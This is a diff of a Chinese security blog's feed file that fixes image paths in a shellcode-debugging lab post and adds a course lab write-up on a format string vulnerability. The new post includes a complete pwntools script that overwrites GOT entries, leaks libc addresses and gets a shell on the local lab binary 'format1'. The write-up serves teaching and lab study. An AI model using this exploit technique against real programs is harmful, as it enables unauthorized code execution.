@@ -1022,55 +1022,55 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/../images/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%80/image-20231010100045889.png"
+                     data-src="/images/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%80/image-20231010100045889.png"
                       alt="image-20231010100045889"
                 ></p>
 <p>（2） 将shellcode.txt拖入SCer.exe程序中，并将其转成Bin文件。</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/../images/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%80/image-20231010100148241.png"
+                     data-src="/images/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%80/image-20231010100148241.png"
                       alt="image-20231010100148241"
                 ></p>
 <p>（3） 打开windbg，并运行SCer.exe。windbg-&gt;File-&gt;Attach to a Process选取SCer.exe。之后在Command窗口输入g，意为继续执行。</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/../images/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%80/wps1.jpg"
+                     data-src="/images/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%80/wps1.jpg"
                       alt="img"
                 ></p>
 <p>（4）之后，利用SCer.exe执行shellcode功能执行刚生成的shellcode.txt.mybin，从而可以看到shellcode中断在执行开始前。</p>
 <p>​		<img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/../images/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%80/wps2.jpg"
+                     data-src="/images/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%80/wps2.jpg"
                       alt="img"
                 > </p>
 <p>（5） 输入t进行步入操作，观察到00b40008处为动态链接库kernel32.dll跳转入口，00b40012为出口。所以在00b40008处采用p指令步过，之后发现计算器被调用，即完成了一次shellcode。</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/../images/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%80/wps3.jpg"
+                     data-src="/images/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%80/wps3.jpg"
                       alt="img"
                 ></p>
 <p>（6）重新开始，在shellcode开始前的中断处输入db查看数据。可以发现00b4001e开始位置表示的为计算器的命名calc.exe，其存储形式为16进制ASCII。</p>
 <p>​		<img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/../images/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%80/wps4.jpg"
+                     data-src="/images/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%80/wps4.jpg"
                       alt="img"
                 > </p>
 <p>（7） 继续运行步入00b40001-&gt;00b40019-&gt;call 00b40003，之后会将其语句的下一行的数据放入栈中(call+标号的语句含义)，所以在走过00b40003后，ebx被存入00b4001e，其为存储calc.exe的地址。</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/../images/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%80/wps5.jpg"
+                     data-src="/images/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%80/wps5.jpg"
                       alt="img"
                 ></p>
 <p>​				<img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/../images/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%80/wps6.jpg"
+                     data-src="/images/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%80/wps6.jpg"
                       alt="img"
                 >		 </p>
 <p>（8）之后调用kernel32.dll，从而调用计算器。</p>
@@ -1079,39 +1079,185 @@
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/../images/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%80/wps7.jpg"
+                     data-src="/images/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%80/wps7.jpg"
                       alt="img"
                 > </p>
 <p>（2）根据数据信息定位00402000，而设置断点进行动态调试。</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/../images/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%80/wps8.jpg"
+                     data-src="/images/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%80/wps8.jpg"
                       alt="img"
                 > </p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/../images/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%80/wps9.jpg"
+                     data-src="/images/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%80/wps9.jpg"
                       alt="img"
                 > </p>
 <p>（3）步入后发现会将00402000地址存入指针，指针再赋值给eax寄存器，eax再传参给ebx，从而同windbg中相同，传参调用kernel32.dll动态链接库，继而调用calc.exe。</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/../images/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%80/wps10.jpg"
+                     data-src="/images/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%80/wps10.jpg"
                       alt="img"
                 > </p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/../images/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%80/wps11.jpg"
+                     data-src="/images/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%80/wps11.jpg"
                       alt="img"
                 > </p>
 <h2 id="5-实验总结"><a href="#5-实验总结" class="headerlink" title="5. 实验总结"></a>5. 实验总结</h2><p>​	通过实验和资料，Windbg为指令集操作，属于内核级别调试器，可以调试内核级的代码；Ollydbg具有窗口化操作界面，具有一定的智能分析能力，为用户态调试器。</p>
 <p>​	OllyDbg 是一个 32 位汇编器级别的分析调试器，只能调试用户态的程序。</p>
 <p>​	WinDbg是Windows平台上一款强大的用户态和内核态调试工具，是微软公司提供的免费调试器。WinDbg不仅可以调试应用程序，还可以完成内核调试、分析崩溃传储文件等工作。自从知名的内核调试工具SoftICE停止开发后，WinDbg就成了内核调试领域的首选调试器。因为它是微软公司的产品，在Win平台的兼容性上有着强大的先天优势。Windbg主要还是利用命令行进行一些调试操作，功能强大。</p>
 <h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a class="link"   href="https://liuruibin.com/posts/c17e/" >https://liuruibin.com/posts/c17e/ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+]]></content>
+      <categories>
+        <category>漏洞分析技术实验</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+        <tag>漏洞分析技术实验</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>漏洞分析技术实验3：格式化字符串漏洞</title>
+    <url>/2023/11/06/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%89/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="实验3：格式化字符串漏洞"><a href="#实验3：格式化字符串漏洞" class="headerlink" title="实验3：格式化字符串漏洞"></a>实验3：格式化字符串漏洞</h1><h2 id="1-实验环境"><a href="#1-实验环境" class="headerlink" title="1.实验环境"></a>1.实验环境</h2><p>Linux虚拟机（Ubuntu）</p>
+<p>format1、libc.so</p>
+<h2 id="2-实验原理"><a href="#2-实验原理" class="headerlink" title="2.实验原理"></a>2.实验原理</h2><p>通过格式化字符串不仅可 以泄露内存数据，还能覆写内存。 在本实验中，将两种利用方式相结合，更好地体会格式化字符串漏洞。</p>
+<p>n：它不是向printf()传递格式化信息，而是令printf()把自己已经输出的字符总数放到相应的整形变量中 </p>
+<p>举例：int i; </p>
+<p>printf(“hello%n”,&amp;i); </p>
+<p>此时i的值为5. </p>
+<p>printf的缓冲区溢出一般printf (“%n”,a):当遇到%n时，程序会检查已经输入了多少字符串，然后将其写入到a中，可以通过这一点来改写栈中内存。 </p>
+<p>（1）%n写入的内存最大为4字节 </p>
+<p>（2）%hn写入的内存最大为2字节 </p>
+<p>（3）%hhn写入的内存最大为1字节</p>
+<h2 id="3-实验要求"><a href="#3-实验要求" class="headerlink" title="3.实验要求"></a>3.实验要求</h2><p>1.format1进行详细分析，编写python脚本，要求拿到shell权限。 </p>
+<p>2.编写完成详细的实验分析报告，对python脚本和漏洞利用过程进行详细分析。</p>
+<h2 id="4-实验过程"><a href="#4-实验过程" class="headerlink" title="4.实验过程"></a>4.实验过程</h2><h3 id="分析format1"><a href="#分析format1" class="headerlink" title="分析format1"></a>分析format1</h3><ol>
+<li>将format1拖入IDA进行初步分析。</li>
+</ol>
+<p>​	可以看到，main函数中调用了getname()函数，读取用户输入并通过printf输出。，在getname中	存在格式化字符串漏洞。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%89/wps1.jpg"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%89/wps2.jpg"
+                      alt="img"
+                ></p>
+<ol start="2">
+<li>检查format1的保护机制</li>
+</ol>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%89/wps3.jpg"
+                      alt="img"
+                ></p>
+<h3 id="漏洞利用思路-3轮漏洞利用"><a href="#漏洞利用思路-3轮漏洞利用" class="headerlink" title="漏洞利用思路:3轮漏洞利用"></a>漏洞利用思路:3轮漏洞利用</h3><p>（1）将exit函数的GOT表地址覆写为main函数的地址。</p>
+<p>​	先解决构建printf（format，argument）中format和argument 。</p>
+<p>（2）通过printf格式化字符串漏洞，获取puts函数地址，再通过libc的相对地址偏移获取system的地址。</p>
+<p>​	通过格式化字符串漏洞，泄露内存数据。</p>
+<p>（3）用格式化字符串漏洞，将system函数地址覆盖GOT表中printf函数的地址，并在buf中写入’&#x2F;bin&#x2F;sh’。当执行printf(buf)时，相当于执行system(‘&#x2F;bin&#x2F;sh’)。</p>
+<p>​	通过格式化字符串漏洞，覆写内存。</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ol>
+<li>将exit函数的GOT表地址覆写为main函数的地址，每次退出时将再返回到main函数。</li>
+</ol>
+<p>（1）先解决构建printf（format，[argument]）中format和argument ：</p>
+<p>format覆写的格式为：% width c % num $ hhn </p>
+<p>width是将要写入到$hhn参数中的值，它由覆写的值和已经写入的长度决定，具体为：（已写入的长度-覆写的值）%0x100 </p>
+<p>（2）num的确定 </p>
+<p>​	num定了要写入的第num个参数，通过调试具体分析一下。</p>
+<p>​	先查看buf的地址是printf的第几个参数，在调用printf处设置断点，buf的地址为0xffffcfbc，printf中格式化字符串的第7个参数，即（0xffffcfbc-0xffffcfa0）&#x2F; 4 &#x3D; 7。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%89/wps5.jpg"
+                      alt="img"
+                ></p>
+<p>​	因为要把exit的GOT地址覆写为main函数地址（通过IDA可以获得main的函数地址0x08048648），所以应写入4个字节，即重复四次“% width c % num $ hhn”。</p>
+<p>​	粗略估计width最多占用3个字节，num最多占用2个字节，则每个格式“% width c % num $ hhn”占用12个字节，四次重复共48个字节，占用48&#x2F;4&#x3D;12个参数（实际可能用不到48个字节，少的部分用其他字符在最后填充）。 </p>
+<p>​	由于buf是从第7个参数开始， 7-18个参数写入用于输出12个字节的基本格式，写入4个字节的地址从第7+12&#x3D;19个参数开始。num依次为19、20、21、22。</p>
+<p>（3）覆盖exit的返回地址</p>
+<p>​	确定了width和num之后，再将要覆盖的exit@got地址0x804a024、0x804a025、0x804a026、0x804a027依次写入到第19、20、21、22个参数中，格式化字符串就构造好了。相当于构造了printf（ “%72c%19$hhn%62c%20$hhn%126c%21$hhn%4c%22$hhnaaaa\x24\xa0\x04\x08\x25\xa0\x04\x08\x26\xa 0\x04\x08\x27\xa0\x04\x08”）</p>
+<p>（4）脚本代码</p>
+<p>​	编写generate_format(addr, value)函数构造格式化字符串，addr为要覆写的地址，value为覆写的值。 </p>
+<p>​	调用generate_format(exit_got,main)，生成的payload作为输入。</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">generate_format</span>(<span class="params">addr, value</span>):</span><br><span class="line">        payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        print_count = <span class="number">0</span></span><br><span class="line">        addr_part = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span> (value &gt;&gt; (<span class="number">8</span>*i)) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            one_byte = (value &gt;&gt; (<span class="number">8</span>*i)) &amp; <span class="number">0xff</span></span><br><span class="line">            payload += <span class="string">&#x27;%&#123;0&#125;c%&#123;1&#125;$hhn&#x27;</span>.<span class="built_in">format</span>((one_byte - print_count) % <span class="number">0x100</span>, <span class="number">19</span> + i)</span><br><span class="line">            print_count += (one_byte - print_count) % <span class="number">0x100</span> </span><br><span class="line">            addr_part += p32(addr + i)</span><br><span class="line">//<span class="number">48</span>字节是粗略估计的，实际可能小于<span class="number">48</span>，用a填充至<span class="number">48</span>字节</span><br><span class="line">        payload = payload.ljust(<span class="number">48</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        payload += addr_part</span><br><span class="line">        <span class="keyword">return</span> payload</span><br></pre></td></tr></table></figure></div>
+
+<p>可以看到</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%89/wps6.jpg"
+                      alt="img"
+                ></p>
+<p> 可以看到，执行完printf后，格式化字符串漏洞就会将exit@got 覆写为main函数的地址，也就是将0x08048486覆盖为0x0848648</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%89/wps7.jpg"
+                      alt="img"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%89/wps8.jpg"
+                      alt="img"
+                ></p>
+<ol start="2">
+<li><p>通过printf格式化字符串漏洞，获取puts函数地址，再通过 libc的相对地址偏移获取system的地址 （1） 获取system的地址的思路</p>
+<p>​	通过格式化字符串漏洞，泄露内存数据最终的目的是获取到shell，即实现system(“&#x2F;bin&#x2F;sh”)。由于格式化字符串漏洞能够泄露内存关键数据，可以考虑利用这个漏洞泄露出system的地址。</p>
+<p>（2）获得GOT表中puts的地址</p>
+<p>​	利用格式化字符串漏洞，泄露出GOT表中puts的地址，计算出system地址构造的格式化字符串格式为“%num$s+puts@got”，即把puts@got的地址写入buf，再通过%s读出。其中%num$s占4个字节，是第7个参数；puts@got占4个字节，是第8个参数，num就可以写为8，即将puts@got的地址写入到第8个参数的位置 。</p>
+<p>（3）计算system地址</p>
+<p>​	获取了puts的实际地址后，再利用libc中system函数与puts函数的偏移，通过libc中两个函数的偏移即可得到system的地址。</p>
+<p>（4）脚本代码如下：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;Welcome~\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;%8$s&#x27;</span>+p32(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">sys_addr = puts_addr - (libc.symbols[<span class="string">&#x27;puts&#x27;</span>]-libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">log.info(<span class="string">&#x27;puts:%#x&#x27;</span>%puts_addr)</span><br><span class="line">log.info(<span class="string">&#x27;sys:%#x&#x27;</span>%sys_addr)</span><br></pre></td></tr></table></figure></div>
+
+<p>可以看到，输出的puts地址的值。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%89/wps9.jpg"
+                      alt="img"
+                ></p>
+</li>
+<li><p>用格式化字符串漏洞，将system函数地址覆盖GOT表中printf函数的地址，并在buf中写入’&#x2F;bin&#x2F;sh’。当执行printf(buf)时，相当于执行system(‘&#x2F;bin&#x2F;sh’)。</p>
+<p>（1）system函数地址覆盖GOT表中printf函数的地址</p>
+<p>​	调用generate_format(printf_got,sys_addr)，生成的payload作为输入。</p>
+<p>​	可以看到在printf()函数执行前后，printf@got中地址的变化，由0xf75cd670变为0xf75beda0（system地址）。</p>
+</li>
+</ol>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%89/wps10.jpg"
+                      alt="img"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%89/wps11.jpg"
+                      alt="img"
+                ></p>
+<p>​	（2）在buf中写入’&#x2F;bin&#x2F;sh’。当执行printf(buf)时，相当于执行system(‘&#x2F;bin&#x2F;sh’)。</p>
+<h3 id="完整攻击脚本代码"><a href="#完整攻击脚本代码" class="headerlink" title="完整攻击脚本代码"></a>完整攻击脚本代码</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_format</span>(<span class="params">addr, value</span>):</span><br><span class="line">        payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        print_count = <span class="number">0</span></span><br><span class="line">        addr_part = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span> (value &gt;&gt; (<span class="number">8</span>*i)) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            one_byte = (value &gt;&gt; (<span class="number">8</span>*i)) &amp; <span class="number">0xff</span></span><br><span class="line">            payload += <span class="string">&#x27;%&#123;0&#125;c%&#123;1&#125;$hhn&#x27;</span>.<span class="built_in">format</span>((one_byte - print_count) % <span class="number">0x100</span>, <span class="number">19</span> + i)</span><br><span class="line">            print_count += (one_byte - print_count) % <span class="number">0x100</span> </span><br><span class="line">            addr_part += p32(addr + i)</span><br><span class="line">        payload = payload.ljust(<span class="number">48</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        payload += addr_part</span><br><span class="line">        <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./format1&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x8048648</span></span><br><span class="line">exit_got = <span class="number">0x804a024</span></span><br><span class="line">puts_got = <span class="number">0x804A01C</span></span><br><span class="line">printf_got = <span class="number">0x804A014</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#overwrite exit_got with main</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome~\n&#x27;</span>)</span><br><span class="line">payload = generate_format(exit_got,main)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak system addr</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome~\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;%8$s&#x27;</span>+p32(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">sys_addr = puts_addr - (libc.symbols[<span class="string">&#x27;puts&#x27;</span>]-libc.symbols[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">log.info(<span class="string">&#x27;puts:%#x&#x27;</span>%puts_addr)</span><br><span class="line">log.info(<span class="string">&#x27;sys:%#x&#x27;</span>%sys_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#overwrite printf_got with system</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome~\n&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload = generate_format(printf_got,sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#binsh</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome~\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="脚本执行效果"><a href="#脚本执行效果" class="headerlink" title="脚本执行效果"></a>脚本执行效果</h3><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E5%AE%9E%E9%AA%8C%E4%B8%89/image-20231106160744451.png"
+                      alt="image-20231106160744451"
+                ></p>
 ]]></content>
       <categories>
         <category>漏洞分析技术实验</category>
